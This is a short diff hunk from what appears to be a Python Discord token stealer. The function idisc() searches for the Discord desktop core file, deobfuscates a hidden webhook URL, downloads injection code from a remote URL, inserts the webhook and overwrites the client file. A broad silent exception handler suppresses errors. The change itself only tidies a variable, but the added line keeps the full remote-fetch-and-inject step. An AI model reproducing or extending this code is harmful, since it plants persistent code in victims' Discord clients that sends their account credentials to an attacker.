@@ -428,8 +428,7 @@ def idisc():
                         if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                             file_path = os.path.join(root, file)
                             hook = deobf(webhook[0],webhook[1]).decode()
-                            webhook = str(hook)
-                            inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
+                            inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", hook)
                             with open(file_path, "w", encoding="utf-8") as f:
                                 f.write(inj_content)
     except: 
